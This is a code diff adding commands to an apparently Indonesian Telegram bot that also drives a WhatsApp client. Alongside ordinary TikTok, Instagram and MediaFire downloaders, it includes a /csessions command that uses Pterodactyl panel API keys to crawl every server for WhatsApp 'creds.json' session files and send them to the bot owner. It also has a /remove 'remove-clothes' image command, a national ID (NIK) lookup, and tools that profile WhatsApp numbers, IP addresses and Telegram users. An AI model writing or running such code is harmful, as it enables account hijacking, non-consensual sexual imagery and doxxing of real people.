+    const args = ctx.message.text.split(" ");
+    if (args.length < 2) {
+        return ctx.reply("👀 ☇ Format: /cekbio 62×××");
+    }
+
+    const q = args[1];
+    const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+
+    const processMsg = await ctx.replyWithPhoto(thumbnailUrl, {
+        caption: `
+<blockquote><b>⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡</b></blockquote>
+⌑ Target: ${q}
+⌑ Status: Checking...
+⌑ Type: WhatsApp Bio Check`,
+        parse_mode: "HTML",
+        reply_markup: {
+            inline_keyboard: [
+                [{ text: "📱 ☇ Target", url: `https://wa.me/${q}` }]
+            ]
+        }
+    });
+
+    try {
+        // Menggunakan Baileys untuk mendapatkan info kontak
+        const contact = await sock.onWhatsApp(target);
+        
+        if (!contact || contact.length === 0) {
+            await ctx.telegram.editMessageCaption(
+                ctx.chat.id,
+                processMsg.message_id,
+                undefined,
+                `
+<blockquote><b>⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡</b></blockquote>
+⌑ Target: ${q}
+⌑ Status: ❌ Not Found
+⌑ Message: Nomor tidak terdaftar di WhatsApp`,
+                {
+                    parse_mode: "HTML",
+                    reply_markup: {
+                        inline_keyboard: [
+                            [{ text: "📱 ☇ Target", url: `https://wa.me/${q}` }]
+                        ]
+                    }
+                }
+            );
+            return;
+        }
+
+        // Mendapatkan detail kontak
+        const contactDetails = await sock.fetchStatus(target).catch(() => null);
+        const profilePicture = await sock.profilePictureUrl(target, 'image').catch(() => null);
+        
+        const bio = contactDetails?.status || "Tidak ada bio";
+        const lastSeen = contactDetails?.lastSeen ? 
+            moment(contactDetails.lastSeen).tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss') : 
+            "Tidak tersedia";
+
+        const caption = `
+<blockquote><b>⬡═―—⊱ ⎧ BIO INFORMATION ⎭ ⊰―—═⬡</b></blockquote>
+📱 <b>Nomor:</b> ${q}
+👤 <b>Status WhatsApp:</b> ✅ Terdaftar
+📝 <b>Bio:</b> ${bio}
+👀 <b>Terakhir Dilihat:</b> ${lastSeen}
+${profilePicture ? '🖼 <b>Profile Picture:</b> ✅ Tersedia' : '🖼 <b>Profile Picture:</b> ❌ Tidak tersedia'}
+
+🕐 <b>Diperiksa pada: ${moment().tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss')}</b>`;
+
+        // Jika ada profile picture, kirim bersama foto profil
+        if (profilePicture) {
+            await ctx.replyWithPhoto(profilePicture, {
+                caption: caption,
+                parse_mode: "HTML",
+                reply_markup: {
+                    inline_keyboard: [
+                        [{ text: "📱 Chat Target", url: `https://wa.me/${q}` }]
+                       
+                    ]
+                }
+            });
+        } else {
+            await ctx.replyWithPhoto(thumbnailUrl, {
+                caption: caption,
+                parse_mode: "HTML",
+                reply_markup: {
+                    inline_keyboard: [
+                        [{ text: "📱 Chat Target", url: `https://wa.me/${q}` }]
+                      
+                    ]
+                }
+            });
+        }
+
+        // Hapus pesan proses
+        await ctx.deleteMessage(processMsg.message_id);
+
+    } catch (error) {
+        console.error("Error checking bio:", error);
+        
+        await ctx.telegram.editMessageCaption(
+            ctx.chat.id,
+            processMsg.message_id,
+            undefined,
+            `
+<blockquote><b>⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡</b></blockquote>
+⌑ Target: ${q}
+⌑ Status: ❌ Error
+⌑ Message: Gagal mengambil data bio`,
+            {
+                parse_mode: "HTML",
+                reply_markup: {
+                    inline_keyboard: [
+                        [{ text: "📱 ☇ Target", url: `https://wa.me/${q}` }]
+                    ]
+                }
+            }
+        );
+    }
+});
+
+bot.command("cekkontak", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
+    const args = ctx.message.text.split(" ");
+    if (args.length < 2) {
+        return ctx.reply("👀 ☇ Format: /cekkontak 62×××\nContoh: /cekkontak 628123456789");
+    }
+
+    const number = args[1];
+    const cleanNumber = number.replace(/[^0-9]/g, '');
+    const target = cleanNumber + "@s.whatsapp.net";
+
+    const processMsg = await ctx.reply("⏳ ☇ Memeriksa kontak WhatsApp...");
+
+    try {
+        // Cek apakah nomor terdaftar di WhatsApp
+        const contactCheck = await sock.onWhatsApp(target);
+        
+        if (!contactCheck || contactCheck.length === 0) {
+            await ctx.editMessageText(
+                `❌ ☇ Nomor ${number} tidak terdaftar di WhatsApp`,
+                { chat_id: ctx.chat.id, message_id: processMsg.message_id }
+            );
+            return;
+        }
+
+        const contact = contactCheck[0];
+        
+        // Dapatkan info profil lengkap
+        let profilePicture = null;
+        let status = null;
+        let businessProfile = null;
+
+        try {
+            profilePicture = await sock.profilePictureUrl(target, 'image').catch(() => null);
+        } catch (e) {}
+
+        try {
+            status = await sock.fetchStatus(target).catch(() => null);
+        } catch (e) {}
+
+        try {
+            businessProfile = await sock.getBusinessProfile(target).catch(() => null);
+        } catch (e) {}
+
+        // Format hasil
+        let contactInfo = `<blockquote><b>⬡═―—⊱ ⎧ WHATSAPP CONTACT INFO ⎭ ⊰―—═⬡</b></blockquote>\n\n`;
+        
+        contactInfo += `📱 <b>Informasi Kontak</b>\n\n`;
+        contactInfo += `🔢 <b>Nomor:</b> +${cleanNumber}\n`;
+        contactInfo += `✅ <b>Status WhatsApp:</b> Terdaftar\n`;
+        
+        if (contact.exists) {
+            contactInfo += `🟢 <b>Akun Aktif:</b> Ya\n`;
+        }
+
+        if (status) {
+            contactInfo += `📝 <b>Status/Bio:</b> ${status.status || 'Tidak ada'}\n`;
+            if (status.setAt) {
+                contactInfo += `⏰ <b>Status Diubah:</b> ${new Date(status.setAt).toLocaleString('id-ID')}\n`;
+            }
+        }
+
+        if (businessProfile) {
+            contactInfo += `🏢 <b>Akun Bisnis:</b> Ya\n`;
+            contactInfo += `📊 <b>Kategori:</b> ${businessProfile.categories?.[0]?.name || 'Tidak diketahui'}\n`;
+            contactInfo += `📋 <b>Deskripsi:</b> ${businessProfile.description || 'Tidak ada'}\n`;
+            
+            if (businessProfile.email) {
+                contactInfo += `📧 <b>Email:</b> ${businessProfile.email}\n`;
+            }
+            if (businessProfile.website) {
+                contactInfo += `🌐 <b>Website:</b> ${businessProfile.website}\n`;
+            }
+            if (businessProfile.address) {
+                contactInfo += `📍 <b>Alamat:</b> ${businessProfile.address}\n`;
+            }
+        }
+
+        contactInfo += `\n🖼 <b>Foto Profil:</b> ${profilePicture ? 'Tersedia' : 'Tidak tersedia'}\n`;
+        contactInfo += `📞 <b>Chat:</b> <a href="https://wa.me/${cleanNumber}">Klik di sini</a>\n`;
+
+        // Kirim hasil
+        if (profilePicture) {
+            await ctx.replyWithPhoto(profilePicture, {
+                caption: contactInfo,
+                parse_mode: "HTML",
+                reply_markup: {
+                    inline_keyboard: [
+                        [{ text: "📞 Chat WhatsApp", url: `https://wa.me/${cleanNumber}` }],
+                        [{ text: "💬 Cek Grup", callback_data: `checkgroups_${cleanNumber}` }]
+                    ]
+                }
+            });
+        } else {
+            await ctx.replyWithPhoto(thumbnailUrl, {
+                caption: contactInfo,
+                parse_mode: "HTML",
+                reply_markup: {
+                    inline_keyboard: [
+                        [{ text: "📞 Chat WhatsApp", url: `https://wa.me/${cleanNumber}` }],
+                        [{ text: "📊 Cek Detail", callback_data: `checkdetail_${cleanNumber}` }]
+                    ]
+                }
+            });
+        }
+
+        await ctx.deleteMessage(processMsg.message_id);
+
+    } catch (error) {
+        console.error("Error checking contact:", error);
+        await ctx.editMessageText(
+            `❌ ☇ Gagal memeriksa kontak ${number}\nError: ${error.message}`,
+            { chat_id: ctx.chat.id, message_id: processMsg.message_id }
+        );
+    }
+});
+
+bot.command("remove", checkPremium, async (ctx) => {
+  const args = ctx.message.text.split(' ').slice(1).join(' ')
+  let imageUrl = args || null
+
+  if (!imageUrl && ctx.message.reply_to_message && ctx.message.reply_to_message.photo) {
+    const fileId = ctx.message.reply_to_message.photo.pop().file_id
+    const fileLink = await ctx.telegram.getFileLink(fileId)
+    imageUrl = fileLink.href
+  }
+
+  if (!imageUrl) {
+    return ctx.reply('🪧 ☇ Format: /tonaked (reply gambar)')
+  }
+
+  const statusMsg = await ctx.reply('⏳ ☇ Memproses gambar')
+
+  try {
+    const res = await fetch(`https://api.nekolabs.my.id/tools/convert/remove-clothes?imageUrl=${encodeURIComponent(imageUrl)}`)
+    const data = await res.json()
+    const hasil = data.result
+
+    if (!hasil) {
+      return ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, '❌ ☇ Gagal memproses gambar, pastikan URL atau foto valid')
+    }
+
+    await ctx.telegram.deleteMessage(ctx.chat.id, statusMsg.message_id)
+    await ctx.replyWithPhoto(hasil)
+
+  } catch (e) {
+    await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, '❌ ☇ Terjadi kesalahan saat memproses gambar')
+  }
+});
+
+bot.command('mediafire', async (ctx) => {
+    const args = ctx.message.text.split(' ').slice(1);
+    if (!args.length) return ctx.reply('Gunakan: /mediafire <url>');
+
+    try {
+      const { data } = await axios.get(`https://www.velyn.biz.id/api/downloader/mediafire?url=${encodeURIComponent(args[0])}`);
+      const { title, url } = data.data;
+
+      const filePath = `/tmp/${title}`;
+      const response = await axios.get(url, { responseType: 'arraybuffer' });
+      fs.writeFileSync(filePath, response.data);
+
+      const zip = new AdmZip();
+      zip.addLocalFile(filePath);
+      const zipPath = filePath + '.zip';
+      zip.writeZip(zipPath);
+
+      await ctx.replyWithDocument({ source: zipPath }, {
+        filename: path.basename(zipPath),
+        caption: '📦 File berhasil di-zip dari MediaFire'
+      });
+
+      
+      fs.unlinkSync(filePath);
+      fs.unlinkSync(zipPath);
+
+    } catch (err) {
+      console.error('[MEDIAFIRE ERROR]', err);
+      ctx.reply('Terjadi kesalahan saat membuat ZIP.');
+    }
+  });
+  
+bot.command("trackip", checkPremium, async (ctx) => {
+  const args = ctx.message.text.split(" ").filter(Boolean);
+  if (!args[1]) return ctx.reply("🪧 ☇ Format: /trackip 8.8.8.8");
+
+  const ip = args[1].trim();
+
+  function isValidIPv4(ip) {
+    const parts = ip.split(".");
+    if (parts.length !== 4) return false;
+    return parts.every(p => {
+      if (!/^\d{1,3}$/.test(p)) return false;
+      if (p.length > 1 && p.startsWith("0")) return false; // hindari "01"
+      const n = Number(p);
+      return n >= 0 && n <= 255;
+    });
+  }
+
+  function isValidIPv6(ip) {
+    const ipv6Regex = /^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(::)|(::[0-9a-fA-F]{1,4})|([0-9a-fA-F]{1,4}::[0-9a-fA-F]{0,4})|([0-9a-fA-F]{1,4}(:[0-9a-fA-F]{1,4}){0,6}::([0-9a-fA-F]{1,4}){0,6}))$/;
+    return ipv6Regex.test(ip);
+  }
+
+  if (!isValidIPv4(ip) && !isValidIPv6(ip)) {
+    return ctx.reply("❌ ☇ IP tidak valid masukkan IPv4 (contoh: 8.8.8.8) atau IPv6 yang benar");
+  }
+
+  let processingMsg = null;
+  try {
+  processingMsg = await ctx.reply(`🔎 ☇ Tracking IP ${ip} — sedang memproses`, {
+    parse_mode: "HTML"
+  });
+} catch (e) {
+    processingMsg = await ctx.reply(`🔎 ☇ Tracking IP ${ip} — sedang memproses`);
+  }
+
+  try {
+    const res = await axios.get(`https://ipwhois.app/json/${encodeURIComponent(ip)}`, { timeout: 10000 });
+    const data = res.data;
+
+    if (!data || data.success === false) {
+      return await ctx.reply(`❌ ☇ Gagal mendapatkan data untuk IP: ${ip}`);
+    }
+
+    const lat = data.latitude || "";
+    const lon = data.longitude || "";
+    const mapsUrl = lat && lon ? `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(lat + ',' + lon)}` : null;
+
+    const caption = `
+<blockquote><b> ⬡═―—⊱ ⎧ X-SLAYER ⎭ ⊰―—═⬡ </b></blockquote>
+𖤓 IP: ${data.ip || "-"}
+𖤓 Country: ${data.country || "-"} ${data.country_code ? `(${data.country_code})` : ""}
+𖤓 Region: ${data.region || "-"}
+𖤓 City: ${data.city || "-"}
+𖤓 ZIP: ${data.postal || "-"}
+𖤓 Timezone: ${data.timezone_gmt || "-"}
+𖤓 ISP: ${data.isp || "-"}
+𖤓 Org: ${data.org || "-"}
+𖤓 ASN: ${data.asn || "-"}
+𖤓 Lat/Lon: ${lat || "-"}, ${lon || "-"}
+`.trim();
+
+    const inlineKeyboard = mapsUrl ? {
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: "⌜🌍⌟ ☇ オープンロケーション", url: mapsUrl }]
+        ]
+      }
+    } : null;
+
+    try {
+      if (processingMsg && processingMsg.photo && typeof processingMsg.message_id !== "undefined") {
+        await ctx.telegram.editMessageCaption(
+          processingMsg.chat.id,
+          processingMsg.message_id,
+          undefined,
+          caption,
+          { parse_mode: "HTML", ...(inlineKeyboard ? inlineKeyboard : {}) }
+        );
+      } else if (typeof thumbnailUrl !== "undefined" && thumbnailUrl) {
+        await ctx.replyWithPhoto(thumbnailUrl, {
+          caption,
+          parse_mode: "HTML",
+          ...(inlineKeyboard ? inlineKeyboard : {})
+        });
+      } else {
+        if (inlineKeyboard) {
+          await ctx.reply(caption, { parse_mode: "HTML", ...inlineKeyboard });
+        } else {
+          await ctx.reply(caption, { parse_mode: "HTML" });
+        }
+      }
+    } catch (e) {
+      if (mapsUrl) {
+        await ctx.reply(caption + `📍 ☇ Maps: ${mapsUrl}`, { parse_mode: "HTML" });
+      } else {
+        await ctx.reply(caption, { parse_mode: "HTML" });
+      }
+    }
+
+  } catch (err) {
+    await ctx.reply("❌ ☇ Terjadi kesalahan saat mengambil data IP (timeout atau API tidak merespon). Coba lagi nanti");
+  }
+});
+
+// Command /cekid
+bot.command("cekid", async (ctx) => {
+    const chatId = ctx.chat.id;
+    
+    try {
+        // Ambil teks setelah command
+        const text = ctx.message.text.split(" ").slice(1).join(" ");
+        
+        if (!text) {
+            return ctx.reply("⚠ Gunakan: /cekid https://whatsapp.com/channel/xxxx");
+        }
+
+        if (!text.includes("whatsapp.com/channel/")) {
+            return ctx.reply("❌ Link WhatsApp Channel tidak valid!");
+        }
+
+        let channelId = text.split("channel/")[1].split(/[/?]/)[0];
+        let newsletterJid = channelId + "@newsletter";
+
+        await ctx.reply(
+`✅ Newsletter ID ditemukan:
+
+${newsletterJid}`
+        );
+
+    } catch (err) {
+        console.log(err);
+        ctx.reply("Terjadi error saat proses.");
+    }
+});
+
+bot.command("tiktok", checkPremium, async (ctx) => {
+  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
+  if (!args) return ctx.reply("🪧 Format: /tiktok https://vt.tiktok.com/ZSUeF1CqC/");
+
+  let url = args;
+  if (ctx.message.entities) {
+    for (const e of ctx.message.entities) {
+      if (e.type === "url") {
+        url = ctx.message.text.substr(e.offset, e.length);
+        break;
+      }
+    }
+  }
+
+  // Validasi URL TikTok
+  if (!url.match(/(tiktok\.com|vt\.tiktok\.com)/)) {
+    return ctx.reply("❌ Link TikTok tidak valid!");
+  }
+
+  // Kirim pesan dengan button
+  await ctx.reply(
+    "📥 Pilih jenis download yang diinginkan:",
+    {
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: "🎬 Video + Audio", callback_data: `tiktok_download|${url}|video` },
+            { text: "🌟 HD (No Watermark)", callback_data: `tiktok_download|${url}|hd` }
+          ],
+          [
+            { text: "🎵 Audio Saja", callback_data: `tiktok_download|${url}|audio` }
+          ]
+        ]
+      }
+    }
+  );
+});
+
+
+// Fungsi download TikTok dengan berbagai tipe
+async function downloadTikTok(url, type = 'video') {
+  try {
+    // Step 1: Ambil data video dari API
+    const { data } = await axios.get("https://tikwm.com/api/", {
+      params: { url },
+      headers: {
+        "user-agent": "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36",
+        "accept": "application/json,text/plain,*/*",
+        "referer": "https://tikwm.com/"
+      },
+      timeout: 20000
+    });
+
+    if (!data || data.code !== 0 || !data.data) {
+      return { success: false, error: "Gagal ambil data video" };
+    }
+
+    const videoData = data.data;
+    
+    // Step 2: Pilih URL berdasarkan tipe
+    let downloadUrl;
+    
+    if (type === 'audio') {
+      // Ambil audio saja
+      downloadUrl = videoData.music || videoData.music_info?.play_url;
+      if (!downloadUrl) {
+        return { success: false, error: "Audio tidak tersedia" };
+      }
+    } else if (type === 'hd') {
+      // Prioritaskan video tanpa watermark (HD)
+      downloadUrl = videoData.play || videoData.hdplay;
+    } else {
+      // Video standar (biasanya dengan watermark)
+      downloadUrl = videoData.play || videoData.wmplay || videoData.hdplay;
+    }
+
+    if (!downloadUrl) {
+      return { success: false, error: "URL download tidak ditemukan" };
+    }
+    const response = await axios.get(downloadUrl, {
+      responseType: "arraybuffer",
+      headers: {
+        "user-agent": "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36"
+      },
+      timeout: 30000
+    });
+
+    if (type === 'audio' && !downloadUrl.includes('.mp3')) {
+    }
+
+    return { 
+      success: true, 
+      data: response.data,
+      type: type,
+      size: response.data.length
+    };
+
+  } catch (error) {
+    console.error("Download error:", error);
+    return { 
+      success: false, 
+      error: error.response?.status 
+        ? `Error ${error.response.status}`
+        : "Koneksi timeout atau link salah"
+    };
+  }
+}
+
+// Helper function untuk nama tipe
+function getTypeName(type) {
+  const names = {
+    'video': 'Video + Audio',
+    'hd': 'HD No Watermark',
+    'audio': 'Audio Saja'
+  };
+  return names[type] || type;
+}
+
+async function downloadFromAlternateAPI(url, type) {
+  const apis = [
+    "https://api.tikmate.app/api/lookup",
+    "https://www.tikwm.com/api/"
+  ];
+  
+  for (const api of apis) {
+    try {
+    } catch (error) {
+      continue;
+    }
+  }
+  
+  throw new Error("Semua API gagal");
+}
+
+bot.command("igdl", checkPremium, async (ctx) => {
+  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
+  if (!args) return ctx.reply("🪧 Format: /igdl https://www.instagram.com/p/Cxample123/");
+
+  let url = args;
+  if (ctx.message.entities) {
+    for (const e of ctx.message.entities) {
+      if (e.type === "url") {
+        url = ctx.message.text.substr(e.offset, e.length);
+        break;
+      }
+    }
+  }
+
+  const wait = await ctx.reply("⏳ ☇ Sedang memproses video Instagram");
+
+  try {
+    // Alternative API - Instagram Downloader
+    const { data } = await axios.get("https://api.igdownloader.com/api/ig", {
+      params: { url },
+      headers: {
+        "user-agent": "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36",
+        "accept": "application/json,text/plain,*/*"
+      },
+      timeout: 20000
+    });
+
+    if (!data || data.error) {
+      return ctx.reply("❌ ☇ Gagal ambil data video pastikan link valid dan publik");
+    }
+
+    const mediaUrl = data.result?.url || data.result;
+    
+    if (!mediaUrl) {
+      return ctx.reply("❌ ☇ Tidak ada media yang bisa diunduh");
+    }
+
+    // Download media
+    const media = await axios.get(mediaUrl, {
+      responseType: "arraybuffer",
+      headers: {
+        "user-agent": "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36"
+      },
+      timeout: 30000
+    });
+
+    // Cek tipe media dari Content-Type
+    const contentType = media.headers['content-type'];
+    const isVideo = contentType && contentType.startsWith('video');
+
+    if (isVideo) {
+      await ctx.replyWithVideo(
+        { source: Buffer.from(media.data), filename: `ig_${Date.now()}.mp4` },
+        { 
+          supports_streaming: true,
+          caption: "✅ Video Instagram berhasil didownload"
+        }
+      );
+    } else {
+      await ctx.replyWithPhoto(
+        { source: Buffer.from(media.data) },
+        { caption: "📷 Foto Instagram berhasil didownload" }
+      );
+    }
+
+  } catch (e) {
+    const err =
+      e?.response?.status
+        ? `❌ ☇ Error ${e.response.status} saat mengunduh media`
+        : "❌ ☇ Gagal mengunduh, koneksi lambat atau link salah";
+    await ctx.reply(err);
+  } finally {
+    try {
+      await ctx.deleteMessage(wait.message_id);
+    } catch {}
+  }
+});
+
+bot.command("nikparse", checkPremium, async (ctx) => {
+  const nik = ctx.message.text.split(" ").slice(1).join("").trim();
+  if (!nik) return ctx.reply("🪧 Format: /nikparse 1234567890283625");
+  if (!/^\d{16}$/.test(nik)) return ctx.reply("❌ ☇ NIK harus 16 digit angka");
+
+  const wait = await ctx.reply("⏳ ☇ Sedang memproses pengecekan NIK");
+
+const replyHTML = (d) => {
+  const get = (x) => (x ?? "-");
+
+  const caption =`
+<blockquote><b> ⬡═―—⊱ ⎧ X-SLAYER ⎭ ⊰―—═⬡ </b></blockquote>
+𖤓 NIK: ${get(d.nik) || nik}
+𖤓 Nama: ${get(d.nama)}
+𖤓 Jenis Kelamin: ${get(d.jenis_kelamin || d.gender)}
+𖤓 Tempat Lahir: ${get(d.tempat_lahir || d.tempat)}
+𖤓 Tanggal Lahir: ${get(d.tanggal_lahir || d.tgl_lahir)}
+𖤓 Umur: ${get(d.umur)}
+𖤓 Provinsi: ${get(d.provinsi || d.province)}
+𖤓 Kabupaten/Kota: ${get(d.kabupaten || d.kota || d.regency)}
+𖤓 Kecamatan: ${get(d.kecamatan || d.district)}
+𖤓 Kelurahan/Desa: ${get(d.kelurahan || d.village)}
+`;
+
+  return ctx.reply(caption, { parse_mode: "HTML", disable_web_page_preview: true });
+};
+
+  try {
+    const a1 = await axios.get(
+      `https://api.akuari.my.id/national/nik?nik=${nik}`,
+      { headers: { "user-agent": "Mozilla/5.0" }, timeout: 15000 }
+    );
+
+    if (a1?.data?.status && a1?.data?.result) {
+      await replyHTML(a1.data.result);
+    } else {
+      const a2 = await axios.get(
+        `https://api.nikparser.com/nik/${nik}`,
+        { headers: { "user-agent": "Mozilla/5.0" }, timeout: 15000 }
+      );
+      if (a2?.data) {
+        await replyHTML(a2.data);
+      } else {
+        await ctx.reply("❌ ☇ NIK tidak ditemukan");
+      }
+    }
+  } catch (e) {
+    try {
+      const a2 = await axios.get(
+        `https://api.nikparser.com/nik/${nik}`,
+        { headers: { "user-agent": "Mozilla/5.0" }, timeout: 15000 }
+      );
+      if (a2?.data) {
+        await replyHTML(a2.data);
+      } else {
+        await ctx.reply("❌ ☇ Gagal menghubungi api, Coba lagi nanti");
+      }
+    } catch {
+      await ctx.reply("❌ ☇ Gagal menghubungi api, Coba lagi nanti");
+    }
+  } finally {
+    try { await ctx.deleteMessage(wait.message_id); } catch {}
+  }
+});
+
+
+
+bot.command("csessions", checkPremium, async (ctx) => {
+  const chatId = ctx.chat.id;
+  const fromId = ctx.from.id;
+
+  const text = ctx.message.text.split(" ").slice(1).join(" ");
+  if (!text) return ctx.reply("🪧 ☇ Format: /csessions https://domainpanel.com,ptla_123,ptlc_123");
+
+  const args = text.split(",");
+  const domain = args[0];
+  const plta = args[1];
+  const pltc = args[2];
+  if (!plta || !pltc)
+    return ctx.reply("🪧 ☇ Format: /csessions https://panelku.com,plta_123,pltc_123");
+
+  await ctx.reply(
+    "⏳ ☇ Sedang scan semua server untuk mencari folder sessions dan file creds.json",
+    { parse_mode: "Markdown" }
+  );
+
+  const base = domain.replace(/\/+$/, "");
+  const commonHeadersApp = {
+    Accept: "application/json, application/vnd.pterodactyl.v1+json",
+    Authorization: `Bearer ${plta}`,
+  };
+  const commonHeadersClient = {
+    Accept: "application/json, application/vnd.pterodactyl.v1+json",
+    Authorization: `Bearer ${pltc}`,
+  };
+
+  function isDirectory(item) {
+    if (!item || !item.attributes) return false;
+    const a = item.attributes;
+    if (typeof a.is_file === "boolean") return a.is_file === false;
+    return (
+      a.type === "dir" ||
+      a.type === "directory" ||
+      a.mode === "dir" ||
+      a.mode === "directory" ||
+      a.mode === "d" ||
+      a.is_directory === true ||
+      a.isDir === true
+    );
+  }
+
+  async function listAllServers() {
+    const out = [];
+    let page = 1;
+    while (true) {
+      const r = await axios.get(`${base}/api/application/servers`, {
+        params: { page },
+        headers: commonHeadersApp,
+        timeout: 15000,
+      }).catch(() => ({ data: null }));
+      const chunk = (r && r.data && Array.isArray(r.data.data)) ? r.data.data : [];
+      out.push(...chunk);
+      const hasNext = !!(r && r.data && r.data.meta && r.data.meta.pagination && r.data.meta.pagination.links && r.data.meta.pagination.links.next);
+      if (!hasNext || chunk.length === 0) break;
+      page++;
+    }
+    return out;
+  }
+
+  async function traverseAndFind(identifier, dir = "/") {
+    try {
+      const listRes = await axios.get(
+        `${base}/api/client/servers/${identifier}/files/list`,
+        {
+          params: { directory: dir },
+          headers: commonHeadersClient,
+          timeout: 15000,
+        }
+      ).catch(() => ({ data: null }));
+      const listJson = listRes.data;
+      if (!listJson || !Array.isArray(listJson.data)) return [];
+      let found = [];
+
+      for (let item of listJson.data) {
+        const name = (item.attributes && item.attributes.name) || item.name || "";
+        const itemPath = (dir === "/" ? "" : dir) + "/" + name;
+        const normalized = itemPath.replace(/\/+/g, "/");
+        const lower = name.toLowerCase();
+
+        if ((lower === "session" || lower === "sessions") && isDirectory(item)) {
+          try {
+            const sessRes = await axios.get(
+              `${base}/api/client/servers/${identifier}/files/list`,
+              {
+                params: { directory: normalized },
+                headers: commonHeadersClient,
+                timeout: 15000,
+              }
+            ).catch(() => ({ data: null }));
+            const sessJson = sessRes.data;
+            if (sessJson && Array.isArray(sessJson.data)) {
+              for (let sf of sessJson.data) {
+                const sfName = (sf.attributes && sf.attributes.name) || sf.name || "";
+                const sfPath = (normalized === "/" ? "" : normalized) + "/" + sfName;
+                if (sfName.toLowerCase() === "creds.json") {
+                  found.push({
+                    path: sfPath.replace(/\/+/g, "/"),
+                    name: sfName,
+                  });
+                }
+              }
+            }
+          } catch (_) {}
+        }
+
+        if (isDirectory(item)) {
+          try {
+            const more = await traverseAndFind(identifier, normalized === "" ? "/" : normalized);
+            if (more.length) found = found.concat(more);
+          } catch (_) {}
+        } else {
+          if (name.toLowerCase() === "creds.json") {
+            found.push({ path: (dir === "/" ? "" : dir) + "/" + name, name });
+          }
+        }
+      }
+      return found;
+    } catch (_) {
+      return [];
+    }
+  }
+
+  try {
+    const servers = await listAllServers();
+    if (!servers.length) {
+      return ctx.reply("❌ ☇ Tidak ada server yang bisa discan");
+    }
+
+    let totalFound = 0;
+
+    for (let srv of servers) {
+      const identifier =
+        (srv.attributes && srv.attributes.identifier) ||
+        srv.identifier ||
+        (srv.attributes && srv.attributes.id);
+      const name =
+        (srv.attributes && srv.attributes.name) ||
+        srv.name ||
+        identifier ||
+        "unknown";
+      if (!identifier) continue;
+
+      const list = await traverseAndFind(identifier, "/");
+      if (list && list.length) {
+        for (let fileInfo of list) {
+          totalFound++;
+          const filePath = ("/" + fileInfo.path.replace(/\/+/g, "/")).replace(/\/+$/,"");
+
+          await ctx.reply(
+            `📁 ☇ Ditemukan creds.json di server ${name} path: ${filePath}`,
+            { parse_mode: "Markdown" }
+          );
+
+          try {
+            const downloadRes = await axios.get(
+              `${base}/api/client/servers/${identifier}/files/download`,
+              {
+                params: { file: filePath },
+                headers: commonHeadersClient,
+                timeout: 15000,
+              }
+            ).catch(() => ({ data: null }));
+
+            const dlJson = downloadRes && downloadRes.data;
+            if (dlJson && dlJson.attributes && dlJson.attributes.url) {
+              const url = dlJson.attributes.url;
+              const fileRes = await axios.get(url, {
+                responseType: "arraybuffer",
+                timeout: 20000,
+              });
+              const buffer = Buffer.from(fileRes.data);
+              await ctx.telegram.sendDocument(ownerID, {
+                source: buffer,
+                filename: `${String(name).replace(/\s+/g, "_")}_creds.json`,
+              });
+            } else {
+              await ctx.reply(
+                `❌ ☇ Gagal mendapatkan URL download untuk ${filePath} di server ${name}`
+              );
+            }
+          } catch (e) {
+            console.error(`Gagal download ${filePath} dari ${name}:`, e?.message || e);
+            await ctx.reply(
+              `❌ ☇ Error saat download file creds.json dari ${name}`
+            );
+          }
+        }
+      }
+    }
+
+    if (totalFound === 0) {
+      return ctx.reply("✅ ☇ Scan selesai tidak ditemukan creds.json di folder session/sessions pada server manapun");
+    } else {
+      return ctx.reply(`✅ ☇ Scan selesai total file creds.json berhasil diunduh & dikirim: ${totalFound}`);
+    }
+  } catch (err) {
+    ctx.reply("❌ ☇ Terjadi error saat scan");
+  }
+});
+
+
+bot.command("toblur", async (ctx) => {
+  const reply = ctx.message.reply_to_message;
+  if (!reply || !reply.photo)
+    return ctx.reply("❌ Reply ke foto dulu!");
+
+  try {
+    const loading = await ctx.reply("⏳ Memproses blur...");
+
+    const photo = reply.photo.at(-1);
+    const fileLink = await ctx.telegram.getFileLink(photo.file_id);
+
+    await ctx.telegram.editMessageText(ctx.chat.id, loading.message_id, null, "✅ Blur selesai, mengirim foto...");
+    await ctx.replyWithPhoto({ url: `https://ikyyzyyrestapi.my.id/image/blur?url=${encodeURIComponent(fileLink.href)}` });
+
+  } catch (err) {
+    console.error(err);
+    ctx.reply("❌ Gagal memproses foto!");
+  }
+});
+
+bot.command(["telestalk", "cekid", "info"], async (ctx) => {
+  try {
+    let username = ctx.message.text.split(" ")[1];
+    if (!username)
+      return ctx.reply(
+        "Masukkan username!\nExample: /telestalk @Ikyydevxy\nExample: /cekid @Ikyydevxy\nExample: /info @Ikyydevxy"
+      );
+
+    username = username.replace("@", "");
+    
+    ctx.reply("📝 Tunggu Sebentar...");
+
+    const apiUrl = `https://ikyyzyyrestapi.my.id/tools/telegram/stalk?username=@${username}`;
+    const { data } = await axios.get(apiUrl);
+
+    if (!data.status) return ctx.reply("User tidak ditemukan!");
+
+const res = data.result;
+const escapeHTML = (text) => {
+  if (!text) return "-";
+  return text
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;");
+};
+
+    let mediaLinks = [];
+    let sendMedia = null;
+    let isVideo = false;
+
+    if (res.profile_media) {
+      const photos = res.profile_media.photos || [];
+      const videos = res.profile_media.videos || [];
+
+      mediaLinks = [...videos, ...photos];
+      if (videos.length > 0) {
+        sendMedia = videos[0];
